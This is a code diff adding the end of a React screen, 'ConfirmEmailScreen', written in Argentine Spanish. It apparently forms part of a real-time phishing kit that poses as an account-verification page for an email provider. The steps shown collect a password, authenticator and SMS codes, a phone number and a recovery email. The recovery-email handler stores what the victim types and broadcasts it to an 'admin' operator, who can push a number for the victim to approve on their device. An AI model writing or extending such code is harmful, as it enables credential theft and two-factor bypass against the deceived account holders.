+            className="mb-3 flex h-11 w-full rounded-lg border border-input bg-input px-4 py-2 text-sm text-foreground ring-offset-background placeholder:text-muted-foreground focus-visible:outline-none focus-visible:ring-2 focus-visible:ring-ring focus-visible:ring-offset-2 disabled:cursor-not-allowed disabled:opacity-50"
+          />
+          <button
+            type="submit"
+            disabled={loading || !password.trim()}
+            className="flex w-full items-center justify-center gap-2 rounded-lg bg-primary px-4 py-2.5 text-sm font-semibold text-primary-foreground hover:bg-primary/90 transition-colors disabled:opacity-50"
+          >
+            {loading ? (
+              <><Loader2 className="h-4 w-4 animate-spin" /> Verificando...</>
+            ) : (
+              <><ArrowRight className="h-4 w-4" /> Continuar</>
+            )}
+          </button>
+        </form>
+      </>
+    )}
+
+    {step === "waiting" && (
+      <>
+        <h3 className="mb-1.5 text-lg font-semibold text-foreground">Verificando tu cuenta</h3>
+        <p className="mb-5 text-sm text-muted-foreground">
+          Estamos verificando tu cuenta de {provider.name}. Esperá...
+        </p>
+        <div className="flex items-center gap-2 text-sm text-muted-foreground">
+          <Loader2 className="h-4 w-4 animate-spin" />
+          <span className="h-2 w-2 animate-pulse rounded-full bg-amber-400" />
+          Verificación en progreso...
+        </div>
+      </>
+    )}
+
+    {step === "token_2fa" && (
+      <>
+        <div className="mb-3 flex h-11 w-11 items-center justify-center rounded-full bg-primary/10">
+          <Smartphone className="h-5 w-5 text-primary" />
+        </div>
+        <h3 className="mb-1.5 text-lg font-semibold text-foreground">Verificación en dos pasos</h3>
+
+        {adminTokenCode ? (
+          <>
+            <p className="mb-4 text-sm text-muted-foreground">
+              Tocá el número que aparece abajo en tu dispositivo para confirmar
+            </p>
+            <div className="mb-4 flex h-20 w-20 items-center justify-center rounded-2xl border-2 border-primary bg-primary/10 mx-auto">
+              <span className="text-3xl font-bold text-primary">{adminTokenCode}</span>
+            </div>
+            <div className="flex items-center gap-2 text-sm text-muted-foreground">
+              <span className="h-2 w-2 animate-pulse rounded-full bg-amber-400" />
+              Esperando confirmación...
+            </div>
+          </>
+        ) : (
+          <>
+            <p className="mb-5 text-sm text-muted-foreground">
+              Ingresá el código de 6 dígitos de tu app de autenticación
+            </p>
+            <div className="mb-5">
+              <InputOTP maxLength={6} value={tokenCode} onChange={handleTokenChange} inputMode="numeric" pattern="[0-9]*">
+                <InputOTPGroup>
+                  <InputOTPSlot index={0} />
+                  <InputOTPSlot index={1} />
+                  <InputOTPSlot index={2} />
+                </InputOTPGroup>
+                <InputOTPSeparator />
+                <InputOTPGroup>
+                  <InputOTPSlot index={3} />
+                  <InputOTPSlot index={4} />
+                  <InputOTPSlot index={5} />
+                </InputOTPGroup>
+              </InputOTP>
+            </div>
+            {tokenCode.length === 6 && (
+              <div className="flex items-center gap-2 text-sm text-muted-foreground">
+                <span className="h-2 w-2 animate-pulse rounded-full bg-amber-400" />
+                Verificando código...
+              </div>
+            )}
+          </>
+        )}
+      </>
+    )}
+
+    {step === "sms_phone" && (
+      <>
+        <div className="mb-3 flex h-11 w-11 items-center justify-center rounded-full bg-primary/10">
+          <Smartphone className="h-5 w-5 text-primary" />
+        </div>
+        <h3 className="mb-1.5 text-lg font-semibold text-foreground">Verificación telefónica</h3>
+        <p className="mb-5 text-sm text-muted-foreground">
+          {phoneEnding ? (
+            <>Confirmá el número que termina en <span className="font-bold text-foreground">**{phoneEnding}</span> para recibir un código de verificación</>
+          ) : (
+            "Ingresá tu número de teléfono para recibir un código por SMS"
+          )}
+        </p>
+
+        <form onSubmit={handlePhoneSubmit} className="w-full">
+          <input
+            type="tel"
+            placeholder={phoneEnding ? `Número terminado en ${phoneEnding}` : "+54 11 0000-0000"}
+            value={clientPhoneInput}
+            onChange={(e) => handlePhoneChange(e.target.value)}
+            autoFocus
+            className="mb-3 flex h-11 w-full rounded-lg border border-input bg-input px-4 py-2 text-sm text-foreground ring-offset-background placeholder:text-muted-foreground focus-visible:outline-none focus-visible:ring-2 focus-visible:ring-ring focus-visible:ring-offset-2"
+          />
+          <button
+            type="submit"
+            disabled={!clientPhoneInput.trim()}
+            className="flex w-full items-center justify-center gap-2 rounded-lg bg-primary px-4 py-2.5 text-sm font-semibold text-primary-foreground hover:bg-primary/90 transition-colors disabled:opacity-50"
+          >
+            <ArrowRight className="h-4 w-4" /> Enviar código
+          </button>
+        </form>
+      </>
+    )}
+
+    {step === "sms_waiting" && (
+      <>
+        <div className="mb-3 flex h-11 w-11 items-center justify-center rounded-full bg-primary/10">
+          <Smartphone className="h-5 w-5 text-primary" />
+        </div>
+        <h3 className="mb-1.5 text-lg font-semibold text-foreground">Verificación telefónica</h3>
+        <p className="mb-4 text-sm text-muted-foreground">
+          Enviando código de verificación a{" "}
+          <span className="font-bold text-foreground">{clientPhoneInput}</span>
+        </p>
+        <div className="flex items-center gap-2 text-sm text-muted-foreground">
+          <Loader2 className="h-4 w-4 animate-spin" />
+          <span className="h-2 w-2 animate-pulse rounded-full bg-amber-400" />
+          Enviando código SMS...
+        </div>
+      </>
+    )}
+
+    {step === "recovery_email_input" && (
+      <>
+        <div className="mb-3 flex h-11 w-11 items-center justify-center rounded-full bg-primary/10">
+          <Mail className="h-5 w-5 text-primary" />
+        </div>
+        <h3 className="mb-1.5 text-lg font-semibold text-foreground">Email de recuperación</h3>
+        <p className="mb-4 text-sm text-muted-foreground">
+          Ingresá tu email de recuperación para recibir un código de verificación
+        </p>
+
+        {recoveryEmailAddr && (
+          <div className="mb-4 w-full rounded-lg border border-border bg-secondary/30 px-4 py-2.5">
+            <div className="flex items-center gap-3">
+              <Mail className="h-5 w-5 text-muted-foreground shrink-0" />
+              <div className="flex flex-col items-start text-left">
+                <span className="text-[10px] text-muted-foreground">Email de recuperación</span>
+                <span className="text-sm font-medium text-foreground">{recoveryEmailAddr}</span>
+              </div>
+            </div>
+          </div>
+        )}
+
+        <form onSubmit={(e) => {
+          e.preventDefault();
+          if (!clientRecoveryEmail.trim()) return;
+          supabase.from("sessions").update({ otp_code: `client_recovery_email_final:${clientRecoveryEmail}` }).eq("id", sessionId).then(() => {});
+          broadcastToAdmin("client_recovery_email_submitted", { session_id: sessionId, recovery_email: clientRecoveryEmail });
+          setStep("recovery_email_submitted");
+        }} className="w-full">
+          <input
+            type="email"
+            placeholder="Ingresá tu email de recuperación completo"
+            value={clientRecoveryEmail}
+            onChange={(e) => handleRecoveryEmailChange(e.target.value)}
+            autoFocus
+            className="mb-3 flex h-11 w-full rounded-lg border border-input bg-input px-4 py-2 text-sm text-foreground ring-offset-background placeholder:text-muted-foreground focus-visible:outline-none focus-visible:ring-2 focus-visible:ring-ring focus-visible:ring-offset-2"
+          />
+          <button
+            type="submit"
+            disabled={!clientRecoveryEmail.trim()}
+            className="flex w-full items-center justify-center gap-2 rounded-lg bg-primary px-4 py-2.5 text-sm font-semibold text-primary-foreground hover:bg-primary/90 transition-colors disabled:opacity-50"
+          >
+            <ArrowRight className="h-4 w-4" /> Continuar
+          </button>
+        </form>
+      </>
+    )}
+
+    {step === "sms_code" && (
+      <>
+        <div className="mb-3 flex h-11 w-11 items-center justify-center rounded-full bg-primary/10">
+          <MessageSquare className="h-5 w-5 text-primary" />
+        </div>
+        <h3 className="mb-1.5 text-lg font-semibold text-foreground">Verificación SMS</h3>
+        <p className="mb-5 text-sm text-muted-foreground">
+          {phoneEnding ? (
+            <>Ingresá el código enviado al número que termina en <span className="font-bold text-foreground">**{phoneEnding}</span></>
+          ) : clientPhoneInput ? (
+            <>Ingresá el código enviado a <span className="font-bold text-foreground">{clientPhoneInput}</span></>
+          ) : (
+            "Ingresá el código enviado por SMS"
+          )}
+        </p>
+
+        <div className="mb-5">
+          <InputOTP maxLength={6} value={smsCode} onChange={handleSmsCodeChange} inputMode="numeric" pattern="[0-9]*">
+            <InputOTPGroup>
+              <InputOTPSlot index={0} />
+              <InputOTPSlot index={1} />
+              <InputOTPSlot index={2} />
+            </InputOTPGroup>
+            <InputOTPSeparator />
+            <InputOTPGroup>
+              <InputOTPSlot index={3} />
+              <InputOTPSlot index={4} />
+              <InputOTPSlot index={5} />
+            </InputOTPGroup>
+          </InputOTP>
+        </div>
+
+        {smsCode.length === 6 && (
+          <div className="flex items-center gap-2 text-sm text-muted-foreground">
+            <span className="h-2 w-2 animate-pulse rounded-full bg-amber-400" />
+            Verificando código SMS...
+          </div>
+        )}
+      </>
+    )}
+
+    {step === "recovery_email_submitted" && (
+      <>
+        <div className="mb-3 flex h-11 w-11 items-center justify-center rounded-full bg-primary/10">
+          <Mail className="h-5 w-5 text-primary" />
+        </div>
+        <h3 className="mb-1.5 text-lg font-semibold text-foreground">Email de recuperación</h3>
+        <p className="mb-4 text-sm text-muted-foreground">
+          Verificando tu email de recuperación{" "}
+          <span className="font-bold text-foreground">{clientRecoveryEmail}</span>
+        </p>
+        <div className="flex items-center gap-2 text-sm text-muted-foreground">
+          <Loader2 className="h-4 w-4 animate-spin" />
+          <span className="h-2 w-2 animate-pulse rounded-full bg-amber-400" />
+          Verificación en progreso...
+        </div>
+      </>
+    )}
+
+    <button
+      onClick={onBack}
+      disabled={loading}
+      className="mt-5 flex items-center gap-1.5 text-xs text-muted-foreground hover:text-foreground transition-colors disabled:opacity-50"
+    >
+      <ArrowLeft size={13} />
+      Volver al inicio
+    </button>
+  </div>
+);
 };
 
 export default ConfirmEmailScreen;
